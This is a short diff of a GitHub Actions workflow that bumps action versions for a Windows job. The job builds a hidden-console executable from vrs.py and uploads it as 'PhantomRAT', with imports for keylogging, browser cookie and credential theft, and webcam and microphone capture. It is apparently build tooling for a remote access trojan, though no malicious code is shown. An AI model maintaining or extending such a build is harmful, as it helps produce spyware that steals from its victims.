@@ -10,10 +10,10 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v3
+    - uses: actions/checkout@v4
 
     - name: Setup Python
-      uses: actions/setup-python@v4
+      uses: actions/setup-python@v5
       with:
         python-version: '3.10'
 
@@ -28,7 +28,7 @@ jobs:
         pyinstaller --onefile --noconsole --hidden-import=pynput --hidden-import=cryptography --hidden-import=psutil --hidden-import=win32gui --hidden-import=win32process --hidden-import=win32api --hidden-import=win32con --hidden-import=win32security --hidden-import=wmi --hidden-import=cv2 --hidden-import=PIL --hidden-import=pyaudio --hidden-import=browser_cookie3 --hidden-import=win32crypt --hidden-import=Crypto vrs.py
 
     - name: Upload EXE
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4
       with:
         name: PhantomRAT
         path: dist/vrs.exe
